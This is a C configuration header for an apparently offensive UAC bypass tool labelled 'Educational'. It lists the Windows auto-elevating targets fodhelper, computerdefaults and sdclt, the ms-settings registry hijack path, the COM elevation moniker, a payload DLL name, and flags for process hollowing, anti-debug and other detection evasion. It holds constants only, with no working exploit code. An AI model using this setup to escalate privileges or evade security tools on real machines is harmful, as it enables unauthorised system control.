#ifndef UAC_BYPASS_CONFIG_H
#define UAC_BYPASS_CONFIG_H

// Configurazione versione
#define VERSION "0.3.0"
#define BUILD_TYPE "Educational"

// Configurazioni di sistema
#define MAX_PATH_LENGTH 260
#define DEFAULT_TIMEOUT 5000  // millisecondi

// Target processes per UAC bypass
#define TARGET_PROCESS L"fodhelper.exe"
#define BACKUP_TARGET_PROCESS L"computerdefaults.exe"
#define FALLBACK_TARGET_PROCESS L"sdclt.exe"

// Registry paths
#define UAC_REG_PATH L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
#define SHELL_REG_PATH L"Software\\Classes\\ms-settings\\shell\\open\\command"
#define COM_REG_PATH L"Software\\Classes\\CLSID"

// Configurazioni DLL
#define PAYLOAD_DLL_NAME L"payload.dll"
#define MAX_DLL_PATH 512
#define VERIFY_DLL_SIGNATURE 1
#define DLL_HASH_CHECK 1

// Logging
#define ENABLE_LOGGING 1
#define LOG_FILE L"uac_bypass.log"
#define LOG_LEVEL_DEBUG 0
#define LOG_LEVEL_INFO 1
#define LOG_LEVEL_WARNING 2
#define LOG_LEVEL_ERROR 3
#define CURRENT_LOG_LEVEL LOG_LEVEL_INFO

// Flags di sicurezza
#define SAFETY_CHECKS 1
#define VERIFY_SIGNATURES 1
#define CHECK_SYSTEM_INTEGRITY 1
#define ENABLE_SANDBOX 1
#define CHECK_PROCESS_HASH 1
#define VERIFY_COM_OBJECTS 1

// COM Configuration
#define COM_ELEVATION_MONIKER L"Elevation:Administrator!new:"
#define COM_TIMEOUT 30000
#define COM_AUTHENTICATION_LEVEL RPC_C_AUTHN_LEVEL_PKT_PRIVACY
#define COM_IMPERSONATION_LEVEL RPC_C_IMP_LEVEL_IDENTIFY

// Detection Evasion
#define ENABLE_EVASION 1
#define PROCESS_HOLLOWING 1
#define MEMORY_PROTECTION 1
#define ANTI_DEBUG 1
#define TIMING_CHECKS 1

// Timeouts
#define INJECTION_TIMEOUT 10000
#define ELEVATION_TIMEOUT 15000
#define REGISTRY_TIMEOUT 5000
#define PROCESS_TIMEOUT 20000

// Security Hashes (SHA256)
#define FODHELPER_HASH L"a9c55a86760812fc75d1f59955c3bc3e..."  // Placeholder
#define COMPUTERDEFAULTS_HASH L"b8d68df4c09d23c39fb7..."        // Placeholder
#define SDCLT_HASH L"c7e44d6f8914c1d5a9b2..."                  // Placeholder

// Error Codes
#define ERROR_COM_INIT 0x1001
#define ERROR_ELEVATION_FAILED 0x1002
#define ERROR_INJECTION_FAILED 0x1003
#define ERROR_REGISTRY_FAILED 0x1004
#define ERROR_HASH_MISMATCH 0x1005
#define ERROR_SIGNATURE_INVALID 0x1006

// Testing
#define ENABLE_TESTS 1
#define TEST_TIMEOUT 60000
#define MOCK_REGISTRY 1
#define MOCK_PROCESSES 1

#endif // UAC_BYPASS_CONFIG_H